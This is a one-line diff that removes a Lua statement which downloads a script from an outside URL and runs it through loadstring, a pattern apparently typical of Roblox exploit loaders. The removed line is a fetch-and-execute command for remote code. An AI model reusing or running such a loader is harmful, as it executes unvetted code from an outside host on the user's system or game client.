@@ -1,1 +1,0 @@
-loadstring(game:HttpGet('https://kelp.fun/cdn/nullptr.lua'))()
